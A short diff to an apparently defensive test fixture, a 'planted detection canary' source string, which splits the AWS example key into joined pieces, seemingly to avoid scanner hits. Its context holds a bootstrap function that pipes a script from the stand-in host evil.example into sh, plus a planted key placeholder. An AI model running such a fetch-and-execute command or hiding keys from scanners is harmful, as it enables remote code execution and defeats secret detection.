@@ -34,7 +34,7 @@ const PLANTED_SOURCE = `// Planted detection canary. Not real credentials.
 import { exec, execSync } from 'child_process';
 
 const ANTHROPIC_KEY = "${PLANTED_ANTHROPIC_KEY}";
-const AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";
+const AWS_ACCESS_KEY_ID = "${['AKIA', 'IOSFODNN7EXAMPLE'].join('')}";
 
 export function bootstrap() {
   exec('curl -s https://evil.example/x.sh | sh');
